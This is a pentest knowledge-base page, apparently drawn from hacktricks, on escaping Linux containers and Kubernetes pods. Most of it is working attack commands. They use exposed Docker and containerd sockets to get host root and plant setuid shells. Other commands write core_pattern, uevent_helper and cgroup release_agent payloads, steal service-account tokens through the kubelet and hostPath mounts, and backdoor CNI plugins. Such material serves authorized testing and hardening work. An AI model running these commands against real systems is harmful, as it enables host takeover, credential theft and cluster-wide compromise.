---
title: "Linux Container / Kubernetes Escape"
type: technique
tags: [linux, container, docker, kubernetes, privilege-escalation, container-escape]
phase: privilege-escalation
date_created: 2026-07-14
date_updated: 2026-07-15
sources: [hacktricks-linux]
---

# Linux Container / Kubernetes Escape

> Part of [[linux-privesc]]. The `docker`/`lxd` group and individual-capability (SYS_ADMIN, SYS_MODULE, SYS_PTRACE) escapes are covered there; this page collects the container-context breakouts.

## Runtime socket exposure (docker.sock / containerd)

Distinct from being in the `docker` group on the host: here a container (or low-priv user) can reach a mounted runtime control socket, which is a direct host-root primitive with no kernel bug. Enumerate broadly, since many runtimes expose the same power under different names.

```bash
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \
  -o -name podman.sock -o -name kubelet.sock -o -name buildkitd.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|BUILDKIT_HOST'
```

Docker socket to host root (client present):

```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu chroot /host bash
```

No client installed? dockerd speaks HTTP over the socket, so `curl` is enough:

```bash
curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cp /bin/bash /host/tmp/rb; chmod 4755 /host/tmp/rb"],
       "HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.24/containers/create
# then /start the returned container id via the same socket
```

containerd / CRI-O paths give the same power:

```bash
ctr --address /run/containerd/containerd.sock run --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest e sh
nerdctl --address /run/containerd/containerd.sock run --rm -it --privileged --pid=host -v /:/host alpine sh
```

---

## runc / ctr host-root mount

If `runc` or `ctr` is callable (as root, or in a rootless setup), craft a container whose root mount IS the host `/`, then chroot in. Useful when there is no daemon socket but the low-level runtime binary is present.

```bash
# runc: generate a spec and point the bind mount at host /
runc spec
# in config.json, add to "mounts": {"type":"bind","source":"/","destination":"/","options":["rbind","rw"]}
mkdir rootfs
runc run demo        # container root is the host root

# ctr: run an existing image with host / bind-mounted
ctr image list
ctr run --mount type=bind,src=/,dst=/,options=rbind -t <image> esc bash
```

Also flag CVE-2024-21626 (runc leaked-fd working-directory escape) when the runc version is vulnerable.

---

## Sensitive host mounts (core_pattern, uevent_helper, modprobe)

When `/proc` or `/sys` is bind-mounted from the host (or writable in the container view), several kernel helper paths execute an attacker-controlled binary in HOST context. Enumerate writable kernel-control entries first.

```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null
find /sys -maxdepth 4 -writable 2>/dev/null
mount | grep -E 'overlay|/proc|/sys|/host'    # recover the host path of your overlay upperdir
```

`/proc/sys/kernel/core_pattern` writable: the kernel runs the pipe handler as root on the next crash.

```bash
host=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
printf '#!/bin/sh\ncp /bin/bash /tmp/rb; chmod 4755 /tmp/rb\n' > /payload; chmod +x /payload
echo "|$host/payload" > /proc/sys/kernel/core_pattern
# crash any process to trigger:  tail -f /dev/null & kill -SEGV $!
```

`/sys/kernel/uevent_helper` or `/proc/sys/kernel/modprobe` writable: same idea, redirect the helper to your host-path payload and trigger a uevent / module autoload.

```bash
echo "$host/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
```

A mounted host `/var` is high value too: read neighboring pods' service-account tokens and overwrite writable overlay snapshot content (web roots, startup scripts). `/opt/cni/bin` writable = delayed host exec on next pod.

---

## Detect the container and abuse a privileged one

Before hunting a kernel bug, fingerprint the container so you know the escape family. Cheap checks:

```bash
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup       # docker/kubepods markers
capsh --print                                            # which caps you actually hold
grep Cap /proc/self/status                               # bounding/effective sets
cat /proc/self/status | grep -i seccomp                  # 0 = unconfined
mount | grep -E 'docker.sock|/host|hostpath'             # dangerous mounts
```

If `--privileged` (all caps + no seccomp/AppArmor), the classic cgroup-v1 `release_agent` escape runs an attacker binary as root on the host when the last task leaves a cgroup:

```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -n1)
printf '#!/bin/sh\nid > %s/escape.out\n' "$host" > /cmd; chmod +x /cmd
echo "$host/cmd" > /tmp/c/release_agent
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"     # trigger
```

Privileged also means you can just `fdisk -l; mount /dev/sda /mnt; chroot /mnt`. If SYS_ADMIN/SYS_MODULE/SYS_PTRACE are held individually (not full privileged), use the matching capability primitive in [[linux-privesc]].

**No escape found (no `docker.sock`, `CapEff=0`, no host mount)? Pivot LATERALLY over the container's
own network instead of trying to break OUT.** A container almost always sits on a bridge network
(`172.17.0.0/16` / `172.18.0.0/16` by default) with siblings and often the host's gateway IP reachable:

```bash
ip route          # confirm the bridge subnet and default gateway (the host, from inside the container)
rustscan -a 172.18.0.1,172.18.0.2,172.18.0.3 --ulimit 5000 -g   # sweep the gateway + sibling containers
```

The gateway IP is frequently the Docker host itself with ports NOT exposed externally (an internal
admin panel, a database, another service only meant for container-to-container traffic) — treat "I
can't escape this container" and "I can't reach anything else" as two separate questions.

---

## Kubernetes node escape: kubelet :10250 and hostPath /var tokens

On a Kubernetes node, the runtime-socket path has a k8s cousin: the kubelet read/exec API on `10250` and service-account tokens reachable via a hostPath mount. These bypass the API-server audit path.

```bash
# the pod's own token, and what it can do
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api

# kubelet read/exec API (often auth-optional or reachable with the node token)
curl -sk https://127.0.0.1:10250/pods
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
# exec into a node-local container (WebSocket client) if authorized -> code exec off-audit

# hostPath /var mounts leak neighbor pods' tokens
find /host-var/lib/kubelet/pods -type f -path '*kubernetes.io~projected*token' 2>/dev/null
```

A stolen token with broad RBAC turns local exec into cluster-wide compromise. `nodes/proxy` with only `get` is dangerous because it still reaches kubelet exec endpoints.

---

## More sensitive host mounts: binfmt_misc, sysrq, debugfs/efivars/securityfs, CNI plugin swap

Extending the core_pattern / uevent_helper / modprobe section above, other host mounts collapse isolation. Sweep for writable kernel-control paths and host-side execution surfaces first.

```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head
find /sys -maxdepth 4 -writable 2>/dev/null | head
mount | grep -E 'overlay|/host|/rootfs'                 # recover container-to-host path (upperdir)
```

Host-exec primitives beyond core_pattern:
- `/proc/sys/fs/binfmt_misc`: register a handler for a magic value; executing a matching file triggers host-context execution.
- `/proc/sysrq-trigger`: `echo b >` reboots the host (DoS but serious).

Kubernetes-flavored mounts are often the real path in infra pods: a writable `/opt/cni/bin` lets you replace a CNI plugin (bridge/portmap/calico/flannel/cilium-cni) so the kubelet runs your code as host on the next pod sandbox creation on that node.

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | grep -E '/(bridge|portmap|calico|flannel|cilium-cni)$' | head -n1)
mv "$plugin" "$plugin.orig"; printf '#!/bin/sh\nid>/tmp/cni\nexec "%s.orig" "$@"\n' "$plugin" > "$plugin"; chmod +x "$plugin"
```

Also treat as critical when mounted/writable: `/sys/kernel/debug` (debugfs, huge kernel-facing surface), `/sys/firmware/efi/efivars` (firmware-backed boot settings), `/sys/kernel/security` (LSM securityfs). Recon sources for kernel exploitation: `/proc/kallsyms`, `/proc/config.gz`, `/proc/kcore`. Mount-handling runtime CVEs to remember: runc CVE-2024-21626, BuildKit CVE-2024-2365x, containerd CVE-2025-47290.
